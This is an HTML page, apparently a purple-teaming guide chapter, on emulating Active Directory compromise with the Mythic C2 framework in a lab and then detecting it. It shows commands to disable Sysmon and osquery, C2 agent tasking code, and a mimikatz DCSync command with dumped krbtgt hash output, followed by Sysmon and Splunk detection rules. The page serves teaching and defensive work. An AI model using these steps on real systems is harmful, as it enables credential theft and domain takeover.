@@ -1,0 +1,538 @@
+<!doctype html>
+<html lang="en-US"><head>
+   <meta charset="utf-8">
+    <!-- Chulapa Jekyll Theme -  -->
+    <!--  MIT License-->
+    <!-- Docs: https://dieghernan.github.io/chulapa -->
+    <!-- Repo: https://github.com/dieghernan/chulapa -->
+    <!-- Page build 2025-02-24 20:58:58 +0000 -->
+     <!-- Jekyll Version 3.10.0 -->
+    <!--Google Structured Data-->
+    <script type="application/ld+json">
+        {
+      "@context": "https://schema.org",
+	  "@type": "Article",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://localhost:4000/part-II/domain-compromise-with-mythic/"
+      },
+      "headline": "Domain Compromise with Mythic",
+      "image": "https://github.com/ajpc500.png",
+      "datePublished": "2025-02-24T20:58:58+00:00",
+      "dateModified": "2025-02-24T20:58:58+00:00",
+      "author": {
+        "@type": "Person",
+        "name": "ajpc500"
+      },
+       "publisher": {
+        "@type": "Organization",
+        "name": "ajpc500",
+        "url": "http://localhost:4000/",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://github.com/ajpc500.png"
+        }
+      }
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BreadcrumbList",
+      "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "name": "Home",
+        "item": "http://localhost:4000/"
+      },{
+        "@type": "ListItem",
+        "position": 2,
+        "name": "Domain Compromise with Mythic"
+      }]
+    }
+    </script>
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebPage",
+    "name": "Domain Compromise with Mythic",
+    "description": ""
+    }
+}
+</script><script type="application/ld+json">
+{
+  "@context" : "https://schema.org",
+  "@type" : "Person",
+  "homeLocation": {
+    "@type": "Place",
+    "name": "London, United Kingdom"
+    },
+  "description": "Publisher",
+  "name" : "ajpc500",
+  "url" : "http://localhost:4000/"
+}
+</script>
+   <title>Domain Compromise with Mythic | A Guide to Purple Teaming</title>
+  <link rel="canonical" href="http://localhost:4000/part-II/domain-compromise-with-mythic/">
+    <!-- Atom feed -->
+  <link href="http://localhost:4000/atom.xml" type="application/atom+xml" rel="alternate" title="Atom feed A Guide to Purple Teaming" >
+    <!-- RSS 2.0 feed -->
+  <link href="http://localhost:4000/rss.xml" type="application/rss+xml" rel="alternate" title="RSS 2.0 feed A Guide to Purple Teaming" >
+    <!-- Meta tags -->
+   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+   <meta name="author" content="ajpc500" >
+   <meta name="copyright" content="ajpc500" >
+   <meta name="description" content="">
+   <meta name="thumbnail" content="https://github.com/ajpc500.png" >
+   <meta name="robots" content="index, follow"><meta name="keywords" content="">
+    <!-- Chrome, Firefox OS and Opera -->
+  <meta name="theme-color" content="#000000">
+    <!-- OpenGraph -->
+   <meta property="og:title" content="Domain Compromise with Mythic | A Guide to Purple Teaming" >
+   <meta property="og:site_name" content="A Guide to Purple Teaming | A Guide to Purple Teaming" >
+   <meta property="og:url" content="http://localhost:4000/part-II/domain-compromise-with-mythic/" >
+   <meta property="og:type" content="website" >
+   <meta property="og:description" content="" >
+   <meta property="og:locale" content="en-US" >
+   <meta property="og:image" content="https://github.com/ajpc500.png" >
+    <!-- Twitter/X Cards -->
+   <meta name="twitter:card" content="summary_large_image"><!-- start custom head snippets -->
+<!-- this script is inserted before the css stylesheet -->
+<!-- end custom head snippets -->
+<!-- CSS -->
+    <!-- Preconnect with Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <!-- Fontawesome-->
+    <!-- v6 -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
+  <link rel="preload" href="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/js/chulapa_script.js" as="script" >
+  <link rel="preload" href="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/fonts/Chulapa/Chulapa-Bold_vmod.otf" as="font" type="font/otf" crossorigin>
+    <!-- Theme css (Bootstrap included) -->
+  <link rel="stylesheet" id="maincss" href="http://localhost:4000/assets/css/main.css" >
+    <!-- Highlighter -->
+  <link id="csshigh" rel="stylesheet" href="http://localhost:4000/assets/css/highlighter.css" >
+    <!-- Custom css -->
+  <link rel="stylesheet" href="http://localhost:4000/assets/css/custom.css" >
+      <!-- start custom head snippets -->
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<!-- end custom head snippets -->
+</head>
+<body class="d-flex flex-column h-entry" id="body">
+	<a class="u-url d-none" href="http://localhost:4000/part-II/domain-compromise-with-mythic/">Invisible link to canonical for Microformats</a>
+	<div class="navbar-chulapa-fab">
+		<input type="checkbox" class="navbar-chulapa-fab-button d-none" id="navi-toggle">
+		<label for="navi-toggle" class="navbar-toggler p-1 m-0 text-center d-flex">
+			<span class="navbar-toggler-icon m-auto">&nbsp;</span>
+		</label>
+		<div class="navbar-chulapa-fab-background">&nbsp;</div>
+		<nav class="navbar-chulapa-fab-nav" aria-label="primary-navigation">
+			<ul class="navbar-nav text-center text-uppercase font-weight-light mt-0 mb-1 py-1">
+				<li class="nav-item">
+					<a class="nav-link px-3 navbar-brand mx-1 " href="http://localhost:4000/">Home</a>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-I:-How-Purple-Teaming-Works" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part I: How Purple Teaming Works</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-I:-How-Purple-Teaming-Works"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-basics-of-purple-teaming">1. The Basics of Purple Teaming </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/offensive-and-defensive-frameworks">2. Offensive and Defensive Frameworks </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-atomic-methodology">3. The Atomic Methodology </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-scenario-based-methodology">4. The Scenario-based Methodology </a></div>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-II:-Attack-Emulation-and-Detection-Lab" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part II: Attack Emulation and Detection Lab</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-II:-Attack-Emulation-and-Detection-Lab"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/environment-setup">5. Environment Setup </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/collecting-telemetry">6. Collecting Telemetry </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/network-traffic-and-event-tracing">7. Network Traffic and Event Tracing </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/lotl-with-atomic-red-team">8. Living-off-the-Land with Atomic Red Team </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/ad-recon-with-mitre-caldera">9. Active Directory Recon with MITRE Caldera </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/domain-compromise-with-mythic">10. Domain Compromise with Mythic </a></div>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-III:-Organizing-an-Exercise" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part III: Organizing an Exercise</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-III:-Organizing-an-Exercise"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-III/reporting-and-tracking">11. Reporting and Tracking </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-III/implementing-a-purple-teaming-function">12. Implementing a Purple Teaming Function </a></div>
+				</li><li class="nav-item my-0 py-1">
+					<a class="nav-link px-3 py-1" href="http://localhost:4000/resources">Resources</a>
+				</li><li class="nav-item my-0 py-1">
+					<a class="nav-link px-3 py-1" href="http://localhost:4000/errata">Errata</a>
+				</li></ul>
+		</nav>
+	</div>	<header class="d-flex align-items-center hero-chulapa"><div class="container-lg py-4">
+   <h1 class="p-name">Domain Compromise with Mythic</h1>
+ </div>
+</header>
+	<main class="container-lg pb-3 flex-fill">
+		<div class="row pt-2">
+			<aside class="col-lg-2 mt-lg-3 small"></aside>
+			<article id="maincontent" class="col-lg-8 mt-3 e-content">
+			<div class="bs-component">
+   <div class="progress">
+       <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: 83.3%; background-color:#eb34e1"></div>
+   </div>
+</div>
+<h2 id="introduction">Introduction</h2>
+<p>In the final emulation chapter, we achieve domain compromise of the Attack Range Active Directory environment through token theft and a DCSync attack. We familiarize with the last of our open-source offensive tools here, Mythic.</p>
+<hr />
+<h2 id="chapter-content">Chapter Content</h2>
+<p>This section provides reproductions of the key figures and code snippets seen in this chapter.</p>
+<h4 id="the-mythic-command-and-control-framework">The Mythic Command-and-Control Framework</h4>
+<h5 id="deploying-mythic">Deploying Mythic</h5>
+<p>Commands to disable Sysmon and osquery from producing unwanted telemetry, as performed in the <a href="/part-II/ad-recon-with-mitre-caldera">previous chapter</a>.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@ar-linux:~<span class="nv">$ </span><span class="nb">sudo </span>systemctl stop sysmon
+ubuntu@ar-linux:~<span class="nv">$ </span><span class="nb">sudo </span>systemctl disable sysmon
+ubuntu@ar-linux:~<span class="nv">$ </span><span class="nb">sudo </span>systemctl stop osqueryd
+ubuntu@ar-linux:~<span class="nv">$ </span><span class="nb">sudo </span>systemctl disable osqueryd
+</code></pre></div></div>
+<p>Commands to clone Mythic into the Linux host’s <code class="language-plaintext highlighter-rouge">/opt</code> directory.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@ar-linux:~<span class="nv">$ </span><span class="nb">cd</span> /opt/
+ubuntu@ar-linux:/opt<span class="nv">$ </span><span class="nb">sudo </span>git clone https://github.com/aguidetopurpleteaming/Mythic.git
+</code></pre></div></div>
+<p>Commands to create the <code class="language-plaintext highlighter-rouge">mythic-cli</code> binary that enables control of Mythic and the installation of its agents and C2 profiles.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@ar-linux:/opt/Mythic<span class="nv">$ </span><span class="nb">sudo </span>apt <span class="nb">install </span>make <span class="nt">-y</span>
+ubuntu@ar-linux:/opt/Mythic<span class="nv">$ </span><span class="nb">sudo </span>make
+</code></pre></div></div>
+<p>A command to start Mythic with the <code class="language-plaintext highlighter-rouge">mythic-cli</code> binary.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@ar-linux:/opt/Mythic<span class="nv">$ </span><span class="nb">sudo</span> ./mythic-cli start
+</code></pre></div></div>
+<h5 id="installing-command-and-control-profiles">Installing Command-and-Control Profiles</h5>
+<p>Commands to install HTTP and peer-to-peer SMB profiles from the pinned AGPT repositories, using the <code class="language-plaintext highlighter-rouge">mythic-cli</code>.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@ar-linux:/opt/Mythic<span class="nv">$ </span><span class="nb">sudo</span> ./mythic-cli <span class="nb">install </span>github https://github.com/aguidetopurpleteaming/http
+ubuntu@ar-linux:/opt/Mythic<span class="nv">$ </span><span class="nb">sudo</span> ./mythic-cli <span class="nb">install </span>github https://github.com/aguidetopurpleteaming/smb
+</code></pre></div></div>
+<h5 id="deploying-agents">Deploying Agents</h5>
+<p>A command to install the Apollo agent, via the <code class="language-plaintext highlighter-rouge">mythic-cli</code>.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ubuntu@ar-linux:/opt/Mythic<span class="nv">$ </span><span class="nb">sudo</span> ./mythic-cli <span class="nb">install </span>github https://github.com/aguidetopurpleteaming/Apollo
+</code></pre></div></div>
+<h5 id="reporting">Reporting</h5>
+<div class="bs-component">
+   <div class="alert alert-warning">
+        You can download <code>MythicATTiRe</code> from: <a target="_blank" href="https://github.com/aguidetopurpleteaming/MythicATTiRe">https://github.com/aguidetopurpleteaming/MythicATTiRe</a>
+   </div>
+</div>
+<h5 id="scripting">Scripting</h5>
+<div class="bs-component">
+   <div class="alert alert-warning">
+        You can download the complete Jupyter notebook from: <a target="_blank" href="https://aguidetopurpleteaming.com/resources/10/AGPT-CP10-Mythic-Whoami-Task-Example.ipynb">https://aguidetopurpleteaming.com/resources/10/AGPT-CP10-Mythic-Whoami-Task-Example.ipynb</a>
+   </div>
+</div>
+<p>The full Jupyter notebook script content.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># %% [markdown]
+# # Mythic API Testing
+</span>
+<span class="c1"># %%
+</span><span class="err">!</span><span class="n">pip</span> <span class="n">install</span> <span class="n">pandas</span> <span class="n">mythic</span>
+<span class="kn">from</span> <span class="nn">mythic</span> <span class="kn">import</span> <span class="n">mythic</span>
+<span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="n">pd</span>
+
+<span class="c1"># %%
+</span><span class="n">mythic_instance</span> <span class="o">=</span> <span class="k">await</span> <span class="n">mythic</span><span class="p">.</span><span class="n">login</span><span class="p">(</span>
+    <span class="n">username</span><span class="o">=</span><span class="s">"mythic_admin"</span><span class="p">,</span>
+    <span class="n">password</span><span class="o">=</span><span class="s">"mythic_password"</span><span class="p">,</span>
+    <span class="n">server_ip</span><span class="o">=</span><span class="s">"10.0.1.21"</span><span class="p">,</span>
+    <span class="n">server_port</span><span class="o">=</span><span class="mi">8443</span><span class="p">,</span>
+    <span class="n">timeout</span><span class="o">=-</span><span class="mi">1</span>
+<span class="p">)</span>
+<span class="k">if</span> <span class="n">mythic_instance</span><span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Connected to Mythic!"</span><span class="p">)</span>
+
+<span class="n">target_host</span> <span class="o">=</span> <span class="s">"AR-WIN-2"</span>
+<span class="n">target_agent</span> <span class="o">=</span> <span class="s">"apollo"</span>
+<span class="n">target_domain</span> <span class="o">=</span> <span class="s">"ATTACKRANGE"</span>
+
+<span class="n">command_name</span> <span class="o">=</span> <span class="s">"shell"</span>
+<span class="n">command_parameters</span> <span class="o">=</span> <span class="s">"whoami"</span>
+
+<span class="c1"># %% [markdown]
+# ## Listing Agents
+</span>
+<span class="c1"># %%
+</span><span class="n">callbacks</span> <span class="o">=</span> <span class="k">await</span> <span class="n">mythic</span><span class="p">.</span><span class="n">get_all_active_callbacks</span><span class="p">(</span><span class="n">mythic</span><span class="o">=</span><span class="n">mythic_instance</span><span class="p">)</span>
+<span class="n">attack_range_agents</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">callbacks</span> <span class="k">if</span> <span class="n">c</span><span class="p">[</span><span class="s">'domain'</span><span class="p">].</span><span class="n">upper</span><span class="p">()</span> <span class="o">==</span> <span class="n">target_domain</span><span class="p">.</span><span class="n">upper</span><span class="p">()]</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Found </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">attack_range_agents</span><span class="p">)</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">target_domain</span><span class="si">}</span><span class="s"> agents"</span><span class="p">)</span>
+<span class="n">pd</span><span class="p">.</span><span class="n">DataFrame</span><span class="p">(</span><span class="n">callbacks</span><span class="p">)</span>
+
+<span class="c1"># %%
+</span><span class="n">hosts</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">attack_range_agents</span> \
+    <span class="k">if</span> <span class="n">c</span><span class="p">[</span><span class="s">'host'</span><span class="p">].</span><span class="n">upper</span><span class="p">()</span> <span class="o">==</span> <span class="n">target_host</span><span class="p">.</span><span class="n">upper</span><span class="p">()</span> <span class="ow">and</span> \
+    <span class="n">c</span><span class="p">[</span><span class="s">'payload'</span><span class="p">][</span><span class="s">'payloadtype'</span><span class="p">][</span><span class="s">'name'</span><span class="p">]</span><span class="o">==</span> <span class="n">target_agent</span>
+<span class="p">]</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="n">hosts</span><span class="p">:</span>
+    <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Could not find </span><span class="si">{</span><span class="n">target_host</span><span class="si">}</span><span class="s"> agent"</span><span class="p">)</span>
+
+<span class="n">agent_id</span> <span class="o">=</span> <span class="n">hosts</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s">'display_id'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Found  agent with Callback Display ID: </span><span class="si">{</span><span class="n">agent_id</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># %% [markdown]
+# ## Executing a Command
+</span>
+<span class="c1"># %%
+</span><span class="n">output</span> <span class="o">=</span> <span class="k">await</span> <span class="n">mythic</span><span class="p">.</span><span class="n">issue_task_and_waitfor_task_output</span><span class="p">(</span>
+    <span class="n">mythic</span><span class="o">=</span><span class="n">mythic_instance</span><span class="p">,</span>
+    <span class="n">command_name</span><span class="o">=</span><span class="n">command_name</span><span class="p">,</span>
+    <span class="n">parameters</span><span class="o">=</span><span class="n">command_parameters</span><span class="p">,</span>
+    <span class="n">callback_display_id</span><span class="o">=</span><span class="n">agent_id</span><span class="p">,</span>
+    <span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">,</span>
+<span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Command output:</span><span class="se">\n</span><span class="si">{</span><span class="n">output</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+<h4 id="simulating-domain-compromise">Simulating Domain Compromise</h4>
+<h5 id="uploading-implants-to-the-admin-share">Uploading Implants to the ADMIN$ Share</h5>
+<figure>
+<img src="/assets/images/10/ad-comp-1.png" style="width: 100%" title="Figure 10-4" />
+<figcaption>Figure 10-4: Permitted and blocked communication paths between Mythic and the <code>ATTACKRANGE.LOCAL</code> hosts</figcaption>
+</figure>
+<h5 id="conducting-dcsync-attacks">Conducting DCSync Attacks</h5>
+<p>An Apollo command to set the process injection method used by the agent.</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">set_injection_technique CreateRemoteThread.CreateRemoteThread</span>
+</code></pre></div></div>
+<p>The formatted command-line for conducting a DCSync attack via an Apollo agent, and the resulting output.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz -Command \"lsadump::dcsync /all\"
+
+  .#####.   mimikatz 2.X (x64) #XXXXX
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # lsadump::dcsync /all
+[DC] 'attackrange.local' will be the domain
+[DC] 'ar-win-dc.attackrange.local' will be the DC server
+[DC] Exporting domain 'attackrange.local'
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+--snip--
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Object Security ID   : S-1-5-21-971293030-2314070895-2582855049-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 27e8aa551692415a1219ba771a0f4fb0
+--snip--
+</code></pre></div></div>
+<h4 id="defending-against-the-attack">Defending Against the Attack</h4>
+<h5 id="admin-share-interactions">ADMIN$ Share Interactions</h5>
+<p>The snippet of Sysmon configuration XML that enables the logging of executable file creation.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;RuleGroup</span> <span class="na">name=</span><span class="s">""</span> <span class="na">groupRelation=</span><span class="s">"or"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;FileCreate</span> <span class="na">onmatch=</span><span class="s">"include"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;TargetFilename</span> <span class="na">name=</span><span class="s">"T1023"</span> <span class="na">condition=</span><span class="s">"contains"</span><span class="nt">&gt;</span>\Start Menu<span class="nt">&lt;/TargetFilename&gt;</span>
+    --snip--
+    <span class="nt">&lt;TargetFilename</span> <span class="na">name=</span><span class="s">"T1165"</span> <span class="na">condition=</span><span class="s">"contains"</span><span class="nt">&gt;</span>\Startup\<span class="nt">&lt;/TargetFilename&gt;</span> 
+    <span class="nt">&lt;TargetFilename</span> <span class="na">name=</span><span class="s">"DLL"</span> <span class="na">condition=</span><span class="s">"end with"</span><span class="nt">&gt;</span>.dll<span class="nt">&lt;/TargetFilename&gt;</span>
+    <span class="nt">&lt;TargetFilename</span> <span class="na">name=</span><span class="s">"EXE"</span> <span class="na">condition=</span><span class="s">"end with"</span><span class="nt">&gt;</span>.exe<span class="nt">&lt;/TargetFilename&gt;</span>
+    --snip--
+  <span class="nt">&lt;/FileCreate&gt;</span>
+<span class="nt">&lt;/RuleGroup&gt;</span>
+</code></pre></div></div>
+<p>Splunk SPL that queries Sysmon logs for file writes to the ADMIN$ share.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">win</span> 
+<span class="nv">EventID</span><span class="o">=</span><span class="mi">11</span>
+<span class="nv">RuleName</span><span class="o">=</span><span class="p">"</span><span class="s2">EXE</span><span class="p">"</span>
+<span class="nv">TargetFilename</span><span class="o">=</span><span class="p">"</span><span class="s2">C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">*</span><span class="p">"</span>
+<span class="nv">Image</span><span class="o">=</span><span class="nv">System</span>
+</code></pre></div></div>
+<p>An example log entry from Zeek that highlights the creation of the <code class="language-plaintext highlighter-rouge">agpt-smb.exe</code> file in the ADMIN$ share.</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"ts"</span><span class="p">:</span><span class="w"> </span><span class="s2">"XXXX-XX-XXT08:50:32.116466Z"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"uid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"CI3YEm1w0eN3vm7Nma"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"id.orig_h"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.0.1.15"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"id.orig_p"</span><span class="p">:</span><span class="w"> </span><span class="mi">49848</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"id.resp_h"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.0.1.14"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"id.resp_p"</span><span class="p">:</span><span class="w"> </span><span class="mi">445</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SMB::FILE_OPEN"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"</span><span class="se">\\\\</span><span class="s2">AR-WIN-DC.ATTACKRANGE.LOCAL</span><span class="se">\\</span><span class="s2">ADMIN$"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"agpt-smb.exe"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"size"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"times.modified"</span><span class="p">:</span><span class="w"> </span><span class="s2">"XXXX-XX-XXT08:50:32.236097Z"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"times.accessed"</span><span class="p">:</span><span class="w"> </span><span class="s2">"XXXX-XX-XXT08:50:32.236097Z"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"times.created"</span><span class="p">:</span><span class="w"> </span><span class="s2">"XXXX-XX-XXT08:50:32.236097Z"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"times.changed"</span><span class="p">:</span><span class="w"> </span><span class="s2">"XXXX-XX-XXT08:50:32.236097Z"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Another Splunk query for Zeek data that identifies the creation of executable formats like .DLL and .BAT in an ADMIN$ share.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">zeek</span> 
+<span class="nv">action</span><span class="o">=</span><span class="nn">SMB::</span><span class="nv">FILE_OPEN</span>
+<span class="nv">path</span><span class="o">=*\\</span><span class="nv">ADMIN</span><span class="err">$</span>
+<span class="nv">name</span> <span class="nv">IN</span> <span class="p">("</span><span class="s2">*.exe</span><span class="p">",</span> <span class="p">"</span><span class="s2">*.dll</span><span class="p">",</span> <span class="p">"</span><span class="s2">*.ps1</span><span class="p">","</span><span class="s2">*.bat</span><span class="p">")</span>
+</code></pre></div></div>
+<h5 id="wmiprvseexe-child-processes">WmiPrvSE.exe Child Processes</h5>
+<figure>
+<img src="/assets/images/10/detect-0.png" style="width: 75%" title="WmiPrvSE.exe child processes" />
+<figcaption>The parent and child relationship for the Apollo binary spawned via WMI</figcaption>
+</figure>
+<p>The parent process of commands launched via WMI on a remote host.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">WmiPrvSE.exe</span><span class="w"> </span><span class="nt">-secured</span><span class="w"> </span><span class="nt">-Embedding</span><span class="w">
+</span></code></pre></div></div>
+<p>A Splunk query for identifying all processes spawned from the <code class="language-plaintext highlighter-rouge">WmiPrvSE.exe</code> process.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="p">"</span><span class="s2">win</span><span class="p">"</span> 
+<span class="nv">EventID</span><span class="o">=</span><span class="mi">1</span> 
+<span class="nv">ParentCommandLine</span><span class="o">=</span><span class="p">"</span><span class="s2">C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">system32</span><span class="se">\\</span><span class="s2">wbem</span><span class="se">\\</span><span class="s2">wmiprvse.exe -secured -Embedding</span><span class="p">"</span>
+</code></pre></div></div>
+<h5 id="splunk-lookup-files">Splunk Lookup Files</h5>
+<p>The contents of the CSV lookup file containing domain controller host details.</p><pre><code class="language-csv">Computer,IPAddress
+ar-win-dc.attackrange.local,10.0.1.14
+</code></pre>
+<p>A Splunk query that makes use of the lookup file to detect WMI lateral movement targeting a domain controller.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="p">"</span><span class="s2">win</span><span class="p">"</span> 
+<span class="nv">EventID</span><span class="o">=</span><span class="mi">1</span> 
+<span class="nv">ParentCommandLine</span><span class="o">=</span><span class="p">"</span><span class="s2">C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">system32</span><span class="se">\\</span><span class="s2">wbem</span><span class="se">\\</span><span class="s2">wmiprvse.exe -secured -Embedding</span><span class="p">"</span>
+<span class="p">[</span> <span class="o">|</span> <span class="nv">inputlookup</span> <span class="nv">attackrange_dcs</span><span class="o">.</span><span class="nv">csv</span> <span class="o">|</span> <span class="nv">fields</span> <span class="nv">Computer</span> <span class="p">]</span>
+</code></pre></div></div>
+<p>The equivalent query with the <code class="language-plaintext highlighter-rouge">inputlookup</code> subsearch expanded.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="p">"</span><span class="s2">win</span><span class="p">"</span> 
+<span class="nv">EventID</span><span class="o">=</span><span class="mi">1</span> 
+<span class="nv">ParentCommandLine</span><span class="o">=</span><span class="p">"</span><span class="s2">C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">system32</span><span class="se">\\</span><span class="s2">wbem</span><span class="se">\\</span><span class="s2">wmiprvse.exe -secured -Embedding</span><span class="p">"</span>
+<span class="nv">Computer</span><span class="o">=</span><span class="p">"</span><span class="s2">ar-win-dc.attackrange.local</span><span class="p">"</span>
+</code></pre></div></div>
+<h5 id="directory-replication-services-traffic">Directory Replication Services Traffic</h5>
+<p>A Splunk query that identifies <code class="language-plaintext highlighter-rouge">DRSGetNCChanges</code> RPC operations that don’t originate from the Attack Range domain controller.</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">index</span><span class="o">=</span><span class="nv">zeek</span>
+<span class="nv">sourcetype</span><span class="o">=</span><span class="p">"</span><span class="s2">bro:dce_rpc:json</span><span class="p">"</span>
+<span class="nv">operation</span><span class="o">=</span><span class="p">"</span><span class="s2">DRSGetNCChanges</span><span class="p">"</span>
